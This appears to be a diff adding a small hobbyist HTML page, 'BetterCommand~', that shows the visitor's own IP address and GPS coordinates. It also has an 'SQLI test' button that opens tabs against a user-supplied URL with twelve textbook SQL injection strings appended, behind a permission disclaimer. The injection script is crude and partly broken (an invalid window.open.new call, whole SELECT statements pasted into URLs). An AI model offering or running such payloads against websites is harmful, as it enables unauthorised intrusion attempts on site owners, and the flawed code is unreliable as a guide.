@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Commands</title>
+</head>
+<body>
+    <h1> </h1>
+    <h1>BetterCommand~</h1>
+    <h1> </h1>
+    <button onclick="GPS()">Coordinates</button>
+    <h1> </h1>
+    <button onclick="IP()">ip address</button>
+    <h1> </h1>
+    <h1> </h1>
+    <input id = "url">
+    <button onclick="SQL()">SQLI test</button>
+    <h1> </h1>
+    <style>
+        input {background-color: darkgrey; border-color: green;}
+        button {background-color: darkgray; border-color: green;}
+        body {background-color: black; text-align: center; color: green;}
+    </style>
+    <script>
+        function SQL(){
+            setTimeout(() => {
+                alert("By clicking ok, you are agreeing that you are not using this feature for anything malicious in any kind of way and that you got permission to do this or own that website! If not exit this page!(We are not resonsible for anything you do with this feature!)");
+                    var site = document.getElementById("url");
+                    var siteV = site.value;
+                    alert("Site name: " + siteV);
+                    alert("To do this action you will also have to turn off popup blocker for out website!");
+                    setTimeout(() => {
+                        console.log("1");
+                        window.open.new(siteV + "'1'='1'");
+                    }, 1000);
+                    setTimeout(() => {
+                        console.log("2");
+                        window.open(siteV + "'1'='1'--");
+                    }, 2000);
+                    setTimeout(() => {
+                        console.log("3");
+                        window.open(siteV + "100 OR '1'='1'");
+                    }, 3000);
+                    setTimeout(() => {
+                        console.log("4");
+                        window.open(siteV + "1=1;");
+                    }, 4000);
+                    setTimeout(() => {
+                        console.log("5");
+                        window.open(siteV + "admin' --");
+                    }, 5000);
+                    setTimeout(() => {
+                        console.log("6");
+                        window.open(siteV + "admin' #");
+                    }, 6000);
+                    setTimeout(() => {
+                        console.log("7");
+                        window.open(siteV + "SELECT * FROM Users WHERE UserID = 1 OR '1'='1'");
+                    }, 7000);
+                    setTimeout(() => {
+                        console.log("8");
+                        window.open(siteV + "SELECT * FROM users WHERE userid = 1 OR '1'='1'");
+                    }, 8000);
+                    setTimeout(() => {
+                        console.log("9");
+                        window.open(siteV + "SELECT * FROM USERS WHERE USERID = 1 OR '1'='1'");
+                    }, 9000);
+                    setTimeout(() => {
+                        console.log("10");
+                        window.open(siteV + "SELECT * FROM Users WHERE ID = 1 OR '1'='1'");
+                    }, 10000);
+                    setTimeout(() => {
+                        console.log("11");
+                        window.open(siteV + "SELECT * FROM users WHERE id = 1 OR '1'='1'");
+                    }, 11000);
+                    setTimeout(() => {
+                        console.log("12");
+                        window.open(siteV + "SELECT * FROM USERS WHERE ID = 1 OR '1'='1'");
+                    }, 12000);
+            }, 500);
+        }
+        function IP(){
+            setTimeout(() => {
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => {
+                    printHTML('IP: ' + data.ip);
+                    })
+                    .catch(error => {
+                    printHTML('Error fetching IP: ' + error);
+                    });
+            }, 500);
+        }
+        function GPS(){
+            setTimeout(() => {
+                if (navigator.geolocation){
+                    navigator.geolocation.getCurrentPosition(showPosition);
+                    function showPosition(Position){
+                        printHTML("Latitude: " + Position.coords.latitude + " Longitude: " + Position.coords.longitude);
+                    }
+                }else{
+                    console.log("geolocation denied");
+                    printHTML("Geolocation was ether denied or not available!");
+                }
+            }, 500);
+        }
+        function printHTML(res = "error"){
+            setTimeout(() => {
+                if (res == "error"){
+                    console.log("Something went wrong!");
+                    document.write("<h1> </h1>");
+                    document.write("<h1>BetterCommand~</h1>");
+                    document.write("<h1> </h1>");
+                    document.write("<h1>" + res + "</h1>");
+                    document.write("<h1> </h1>");
+                    document.write("<style>input {background-color: darkgrey; border-color: green;}button {background-color: darkgray; border-color: green; width: 50px; height: 50px;}body {background-color: black; text-align: center; color: green;} canvas {background-color: darkgray; border-color: green;}</style>");
+                }else{
+                    console.log("No errors");
+                    document.write("<h1> </h1>");
+                    document.write("<h1>BetterCommand~</h1>");
+                    document.write("<h1> </h1>");
+                    document.write("<h1>" + res + "</h1>");
+                    document.write("<h1> </h1>");
+                    document.write("<style>input {background-color: darkgrey; border-color: green;}button {background-color: darkgray; border-color: green; width: 50px; height: 50px;}body {background-color: black; text-align: center; color: green;} canvas {background-color: darkgray; border-color: green;}</style>");
+                }
+            }, 500);
+        }
+    </script>
+</body>
+</html>
